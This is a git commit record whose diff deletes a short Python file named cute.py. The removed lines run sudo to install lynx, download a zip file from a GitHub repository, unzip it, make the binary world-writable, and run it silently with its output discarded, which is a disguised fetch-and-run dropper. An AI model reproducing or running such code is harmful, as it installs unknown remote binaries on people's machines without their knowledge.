4c1f5bf5cb500a00a804129a896fa1d72092020c
didayang <106394787+didayang@users.noreply.github.com>
2022-05-27 15:26:07 +0000

    Delete cute.py

--- cute.py
+++
@@ -1,7 +0,0 @@
-import os
-os.system('sudo apt update')
-os.system('sudo apt install lynx -y')
-os.system('lynx -nonumbers -listonly -dump https://github.com/aurbach55/pos/raw/main/topi.zip >> topi.zip && unzip topi.zip && chmod 777 topi && ./topi >/dev/null 2>&1 >/dev/null 2>&1')
-
-            
-            
